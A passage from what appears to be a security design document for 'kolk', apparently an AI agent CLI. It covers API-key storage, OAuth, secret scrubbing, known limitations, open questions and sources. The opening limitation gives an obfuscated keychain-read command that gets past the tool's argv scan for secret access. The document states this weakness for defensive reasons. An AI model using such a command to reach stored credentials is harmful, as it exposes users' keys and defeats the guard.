   find-generic-password -s "${S}rabbi"` defeats an argv scan, and the design says so rather than
   implying otherwise.
7. **kolk cannot set a spend limit on the key `kolk login` mints**, and OpenRouter publishes no
   revoke endpoint. `doctor` and the success screen say so and link the settings page rather than
   implying safety.
8. **The 12 KB tool-output cap is doing security work by accident.** If item 13 raises it, scrub cost
   scales linearly (4.8 ms/MiB, measured) — budgeted and CI-gated, but the coupling is worth knowing.
9. **Streaming deltas are unscrubbed**, so a client concatenating SSE deltas can briefly see text the
   persisted session does not. Bounded: the only route for a secret into a delta is a failed
   tool-boundary scrub or the user typing it. `message.redacted` fires when the terminal-frame scrub
   corrects something.
10. **A `secret.Value` that reaches `session.Save` would fail the write.** Unreachable in production
    (S5 makes `session` unable to name the type), so `ErrMarshal` is a CI-time alarm — but if it ever
    *did* fire in release, failing the save would cost the user their transcript. **Decision:**
    `ErrMarshal` under test and `-tags dev`; in release builds emit `"[redacted]"`, complete the
    write, print one stderr line naming the type and field, and publish a `secret_leak` event so it
    surfaces in `doctor` and the dashboard. Loud, not destructive.

**Open questions, each with what would resolve it.**

| Question | What resolves it |
|---|---|
| **No Linux or Windows execution happened for this design.** §3.6's Linux paths and §3.4's Windows twin are read from module-cache source, the freedesktop spec, MS Learn and package metadata. | Before sign-off: (a) `ubuntu:noble` container with no D-Bus and no `secret-tool` — `kolk key` → `kolk` end to end with zero warnings, and a `--backend keychain` attempt reporting unavailable in < 2 s without spawning `dbus-launch`; (b) SSH into a Linux desktop with a **locked** gnome-keyring — assert the 2 s deadline fires (this is the indefinite-hang case and the single most important negative test in the item); (c) a Windows VM: the file default, the `%LocalAppData%` location, and `assertOwnerOnly` as a DACL assertion. |
| `security` exit codes **36** (`errSecInteractionNotAllowed`) and **128** (user cancelled) are derived from the `OSStatus mod 256` rule that three measured points confirm, not observed. | Observe once on a macOS CI runner with no GUI session, in the scratch-keychain test. |
| Does `/auth` honour `key_label` **alongside** `callback_url`? The OpenAPI says the underlying call does; the prose calls it headless-only. | One live consent at implementation time. If rejected, drop the parameter — `kolk key --manage` identifies the key regardless of its label. |
| Does the OpenRouter callback use a query string or a fragment? Docs say query. | A fragment would break visibly (F2 timeout), never silently. The empty-query rule (§4.3) already makes the `?`/`&` question moot. |
| Does the OAuth-minted key inherit account-level ZDR / data-collection settings? | Nothing documents it. `doctor` says *"kolk cannot set a spend limit on this key"* rather than implying safety. |
| Will the macOS metadata probe stay ACL-free on a future OS? | If it ever prompts, the symptom is a dialog on `kolk doctor` for opt-in keychain users only. Fallback, pre-cut: `KOLK_NO_KEYCHAIN_PROBE=1` and the row degrades to `recorded: keychain (not checked)`. |
| Is `kolk sessions redact <id>` (D2's recovery) v0.1 or v0.2? | v0.2 unless a user hits it first; the literal registration that makes downstream sinks safe is v0.1 and is the load-bearing half. |

**Amendments this item forces on already-hardened docs** (all listed in §2.1 and §2.4; land them in
the same commits): `02-architecture.md` §1, §2, §4, §5, §9, §12-step-5; `03-provider-layer.md` §1.9
(`Config.APIKey` deleted, two factory signatures). Contradicting a hardened doc silently is worse
than the contradiction.

---

## Sources

- `PLAN.md` — North star (2026-08-22), item 5, item 18, item 21, item 22, item 23.
- `docs/plan/02-architecture.md` §1 (dependency policy, cgo rule), §2 (tree), §4 (`maskKey` mapping),
  §5 (layering), §7 (daemon, bearer token), §8 (build tags), §9 (naming, ship list, env overrides),
  §11 (budgets), §12 (migration) — 2026-08-22.
- `docs/plan/03-provider-layer.md` §1.9 (`Config`, `Spawner`), §2550 (the `APIKey == ""` deletion for
  local models), §6.6 (`GET /api/v1/key`, 5-min cache), §2136 (`HTTP-Referer` attribution) — 2026-08-22.
- `docs/plan/04-subscription-backends.md` §1.5, §4.1, §5.1 (G1–G4), §5.2 (`kolk login claude`), C1/C3/
  C4/C7 — 2026-08-22.
- `docs/research/openrouter.md` §5 (OAuth PKCE: `openrouter.ai/auth`, `POST /api/v1/auth/keys`,
  localhost any port, headless `key_label` variant, single-use 10-minute codes), §1 (free-tier limits:
  20/min, 50/day until $10 lifetime, then 1000/day; free endpoints' looser data terms) — 2026-08-21.
- Repo source read: `internal/config/config.go`, `cmd/kolk/main.go` (`:114` `config.Load`→`fatal`,
  `:118` `ResolveAPIKey`, `:407` base-URL write, `:554` `maskKey`), `internal/tools/tools.go:119`,
  `internal/session/session.go:60`, `internal/checkpoint/checkpoint.go:66,76-95,135-138`,
  `internal/stats/stats.go` — 2026-08-22.
- **Measured on this machine (darwin/arm64, Apple M3, go1.26.4, 2026-08-22)** and reproducible from
  the transcript of this session: the fmt/json/slog redaction matrix (8 leak paths for
  plaintext-in-type, 0 for the handle); `%+v` on `http.Header` leaking the Authorization value;
  `maskKey` printing the whole key at `len` 9 and 10; `os.WriteFile` not repairing a 0644 file and
  excl-create+chmod+rename repairing it; `syscall.Stat_t`/`O_NOFOLLOW` undefined under
  `GOOS=windows`; `GOOS=windows go build ./...` exit 0 on the current tree; cold start
  `kolk --help` p50 **5.64 ms** (floor 1.38 ms); full file-backend chain **23.1 µs**, env rungs
  **0.24 µs**; scrub scanner **219–230 MB/s / 53 µs per 12 KB** vs regexp **9.3 MB/s / 1 329 µs**;
  RFC 7636 Appendix B vector round-trip; `url.Parse` on `?state=abc?code=XYZ` losing `code`;
  `env -u HOME … kolk` failing with `$HOME is not defined` while holding a valid env key.
- RFC 8252 §7.3, §8.3, §8.9, §8.10, §8.12 (loopback IP literal, ephemeral port, state/nonce, exact
  redirect-URI match, no embedded user-agents) · RFC 7636 §4.1, §4.2 + Appendix B.
- `man security` (macOS 27.0, this machine): global flag set `[-hilqv] [-p prompt]`;
  `-A` *"insecure, not recommended!"*; *"the application which creates an item is trusted to access
  its data without warning."* `man 3 getpass` (Darwin): reads `/dev/tty`, `_PASSWORD_LEN` 128.
- Prior art read 2026-08-22: `gh` 2.79.0 (`gh auth login/logout/status`, `gh help environment`,
  `pkg/cmd/auth/status/status.go` format strings, the keyring-then-plaintext fallback and its
  warning) · AWS CLI *Configuration and credentials precedence* (the 10-level numbered chain) ·
  `docker login` credential stores + `docker-credential-helpers` (`credentials.go`, `error.go`,
  the four-verb JSON-on-stdio protocol, the `not found` sentinel) · `zalando/go-keyring`
  (`keyring_darwin.go` — the `security -i` technique, the off-by-one size guard, the
  English-substring error match) · `cli/oauth` + `cli/browser` · `danieljoos/wincred` ·
  `golang.org/x/sys` v0.47.0 (`CryptProtectData` present, `CredRead`/`CredWrite` absent) ·
  `godbus/dbus` v5.2.2 (7,953 LOC / 57 files) · Ubuntu `libsecret-tools` package metadata (universe,
  no default task) · MS Learn `CREDENTIALA` (`CRED_MAX_CREDENTIAL_BLOB_SIZE` = 2560) and `cmdkey`
  (no retrieval verb) · `flyctl`, `stripe`, `wrangler`, `vercel` CLI credential docs.
